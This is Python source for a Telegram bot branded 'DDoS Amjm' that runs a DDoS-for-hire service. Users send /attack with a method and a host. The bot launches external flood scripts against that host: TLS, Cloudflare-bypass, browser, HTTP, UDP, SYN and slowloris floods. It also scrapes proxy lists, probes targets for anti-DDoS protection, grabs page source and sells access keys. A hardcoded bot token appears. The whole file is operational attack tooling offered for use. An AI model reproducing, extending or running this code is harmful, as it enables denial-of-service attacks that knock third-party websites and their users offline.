import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading
import socket
import threading
import argparse
import random
import os
import time
import requests
import cloudscraper
from colorama import Fore
from urllib.parse import urlparse
from random import choice as che
from random import randint as ran
from random import _urandom as byt
from certifi import where
from ssl import CERT_NONE, SSLContext, create_default_context
from threading import Thread as thr
from colorama import init as colorama_init
from http.client import HTTPResponse as httpr
from requests import get

bot_token = '7672118906:AAENX15UVxxbOhpYU-KfnLi-aUBN1Zy6H04'
ALLOWED_GROUP_CHAT_ID = -1002303206802

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002303206802
#-1002477513899
allowed_users = []
processes = []
ADMIN_ID = 1908668826
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Admin Only')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Enter Correct Format /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Added User With ID: {user_id} Using Command 30 Days')


load_users_from_database()




@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
    🩸 Welcome to DDoS Amjm
📌 All Commands:
✱DDoS Command (Website Attack)
- /attack + [methods] + [host]
- /methods: To View Methods
- /check + [host]: Check AntiDDoS
- /proxy: Check Number of Proxies
✱Useful Commands ^^
- /code + [host]: Get Website Source Code
- /getproxy: Proxy Will Automatically Update After 10 Minutes
- /list: View list of prx that can be obtained
- /prx + Type of Proxy You Want to Get
[ Live Proxy 95% Die 5% ]
- /time: Number of Time Bot Active
✱Info Admin
- /muakey: To Buy VIP Key
- /admin: Info Admin
- /on: On Bot
- /off: Off Bot
'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['list'])
def fa(message):


    help_text = '''
List :
HTTP : GET PROXY HTTP
HTTPS : GET PROXY HTTPS
SOCKS4 : GET PROXY SOCKS4
SOCKS5 : GET PROXY SOCKS5

'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['prx'])
def proxy(message):

        
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently Off. Please Wait Until It Is Enabled Again.')
        return
        
    args = message.text.split(" ")
    if len(args) != 2:
        bot.reply_to(message, "Please Use According To Syntax.\nExample : /prx + proxy type to get")
        return
    
    proxy_type = args[1].upper()
    if proxy_type not in ['HTTP', 'TRIS' , 'HTTPS', 'SOCKS4', 'SOCKS5']:
        bot.reply_to(message, "Invalid Selection. Type /list to View Selection.")
        return

    sources = {
        'HTTP': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://www.freeproxychecker.com/result/http_proxies.txt'
        ],
        'TRIS': [ ## lỗi
            'https://onlytris.name.vn/get-proxy.php?key=Phongkhuenunglon'
        ],
        'HTTPS': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=https',
            'https://www.freeproxychecker.com/result/https_proxies.txt'
        ],
        'SOCKS4': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4'
        ],
        'SOCKS5': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5'
        ]
    }

    proxies = []
    for source in sources.get(proxy_type, []):
        try:
            response = requests.get(source)
            if response.status_code == 200:
                proxies.extend(response.text.splitlines())
        except:
            pass

    if len(proxies) > 0:
        filename = 'FAMOD-PROXY-{}.txt'.format(proxy_type.lower())

        with open(filename, 'w') as file:
            file.write('\n'.join(proxies))

        bot.send_document(message.chat.id, open(filename, 'rb'))
        bot.reply_to(message, "Get Proxy Request {} Successful.\nFile {} Sent To @{}".format(proxy_type, filename, message.from_user.username))
    else:
        bot.reply_to(message, "Cannot Get Free Proxy List.")
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 All Methods:
🚀 Layer7
[ No Gov, Medu,Dstat ]
✱TLS
✱BROWSER
✱CF-BYPASS
✱HTTP
✱HTTPS
[ Pem Gov, Medu ]
✱GOD
🚀 Layer4
✱TCP-FLOOD
✱UDP-FLOOD
✱HTTP-FLOOD
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Attack Command Stopped, Thank You For Using")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return
@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently disabled. Please wait until it is enabled again.')
        return
    if message.chat.id != ALLOWED_GROUP_CHAT_ID:
        bot.reply_to(message, f"\nJoin Group DDoS: https://t.me/Ddos_Amjm_group")
        return 

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Please enter correct syntax.\nExample: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Please wait {remaining_time} seconds before reusing the command /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['HTTP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Please enter both ports.\nExample: /attack {method} {host} [port]')
        return

    if method in ['HTTP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.ir", ".gov.ir", ".medu.ir", ".dstat" ,".count123.org" ,".gov", ".gov.", ".dstat.", "dstat.", ".nasa.", "nasa."]   
    if method == 'TLS' or method == 'BROWSER' or method == 'HTTP' or method == 'CF-BYPASS' or method == 'HTTPS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"It is not allowed to attack websites with domain names {blocked_domain}")
                return

    if method in [ 'HTTPS', 'TLS', 'GOD', 'BROWSER', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'HTTP-FLOOD', 'HTTP']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["python", "ddos.py", "tlsv2" , host, "443", "1000", "15000", "90"]
            duration = 90
        elif method == 'GOD':
            command = ["python", "dosi.py", "bypass", host, "443", "1000", "15000"]
            duration = 90
        elif method == 'BROWSER':
            command = ["python", "Ados.py", "browser", host, "90", "1000", "15000", "0"]
            duration = 90
        elif method == 'HTTP':
            command = ["node", "HTTP-FLOOD.js", host, "90", "5", "90", "proxy.txt"]
            duration = 90
        elif method == 'HTTPS':
            command = ["python", "dosi.py", "https", host, "443", "1000", "1000"]
            duration = 90
        elif method == 'CF-BYPASS':
            command = ["python", "ddos.py", "cloud" , host, "443", "1000", "15000", "90"]
            duration = 90
        elif method == 'UDP-FLOOD':
            command = ["python", "pyddos.py", "-d", host, "-s", "100", "-Request", "10"]
            duration = 90
        elif method == 'TCP-FLOOD':
            command = ["python", "pyddos.py", "-d", host, "-Synflood", "-T", "5000", "-t", "10.0"]
            duration = 90
        elif method == 'HTTP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port must be a positive integer.')
                return
            command = ["python", "pyddos.py", "-d", host, "-p", port, "-T" , "2000", "-Pyslow"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} seconds\n┣➤Check Host: https://check-host.net/check-http?host={host}\n┣➤ Channel : @DDoS_Amjm & @Amjm_DDoS \n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Invalid attack method. Use command /methods to see attack method')

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Number of proxies: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Not found file proxy.txt.")
    else:
        bot.reply_to(message, 'You do not have permission to use this command.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"The newly updated proxy number is: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You do not have permission to use this command.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You do not have permission to use this command.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'The bot has been disabled. All users cannot use other commands.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You do not have permission to use this command.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'The bot has been restarted. All users can use commands normally again.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently disabled. Please wait until it is enabled again.')
        return
    
    
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter correct syntax.\nExample: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Unable to get source code from this site. Please check the URL again.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'The site is not HTML or PHP. Please try with a site URL that contains an HTML or PHP file.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_codeweb')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'An error occurred: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter correct syntax.\nExample: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Website IP: {url}\nTo be: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website has 1 IP which is not antiddos capable."
        else:
            reply += "Website has more than 1 IP, antiddos ability is very high.\nThis website cannot be attacked."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: t.me/Hj_Amir3")


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot is currently disabled. Please wait until it is enabled again.')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Minutes Self Update\nNumber of proxies: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Not found file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} hour, {minutes} minute, {seconds} second'
    bot.reply_to(message, f'Bot is up and running: {uptime_str}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Invalid command. Please use the /help command to view a list of commands.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
